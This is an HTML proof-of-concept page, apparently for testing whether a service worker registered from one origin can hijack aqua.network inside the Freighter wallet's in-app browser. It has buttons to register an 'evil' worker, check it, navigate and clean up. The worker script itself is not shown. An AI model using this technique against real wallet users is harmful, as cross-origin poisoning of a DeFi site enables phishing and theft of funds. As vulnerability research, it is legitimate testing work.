<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SW Cross-Origin Poison - Freighter Test</title>
<style>body{font-family:monospace;padding:15px;background:#111;color:#0f0} button{padding:12px;width:100%;margin:5px 0;background:#0f0;color:#000;font-weight:bold} pre{background:#222;padding:10px;white-space:pre-wrap;word-break:break-all}</style>
</head>
<body>
<h2>SW Cross-Origin Poison Test</h2>
<p>Origin: <b id=origin></b></p>
<pre id=log></pre>

<button onclick="registerSW()">1. Register Evil SW from 0x403for</button>
<button onclick="checkSW()">2. Check SW Registration</button>
<button onclick="goAqua()">3. Navigate to aqua.network (test poison)</button>
<button onclick="clearSW()">Clear SW (cleanup)</button>

<script>
const logEl = document.getElementById('log');
function log(t){ logEl.textContent += t+'\n'; console.log(t); }
document.getElementById('origin').textContent = location.origin;
log('Page loaded: '+location.href);

async function registerSW(){
  log('\n--- Registering SW ---');
  try{
    let reg = await navigator.serviceWorker.register('/sw.js', {scope:'/'});
    log('SW Registered: '+reg.scope);
    await navigator.serviceWorker.ready;
    log('SW READY - Active: '+navigator.serviceWorker.controller);
    log('Now click button 3 to navigate to aqua.network');
  }catch(e){
    log('Register ERR: '+e.message);
    try{
      let reg2 = await navigator.serviceWorker.register('./sw.js', {scope:'./'});
      log('Fallback SW Registered: '+reg2.scope);
    }catch(e2){ log('Fallback ERR: '+e2.message); }
  }
}

async function checkSW(){
  let regs = await navigator.serviceWorker.getRegistrations();
  log('\n--- SW Registrations: '+regs.length+' ---');
  regs.forEach(r=>log('Scope: '+r.scope+' | Active: '+!!r.active));
  log('Controller: '+(navigator.serviceWorker.controller ? navigator.serviceWorker.controller.scriptURL : 'none'));
}

function goAqua(){
  log('\n--- Navigating to aqua.network ---');
  log('If Single WebView bug, aqua.network will be served by 0x403for SW');
  location.href = 'https://aqua.network';
}

async function clearSW(){
  let regs = await navigator.serviceWorker.getRegistrations();
  for(let r of regs){ await r.unregister(); }
  log('All SW unregistered');
}
</script>
</body>
</html>
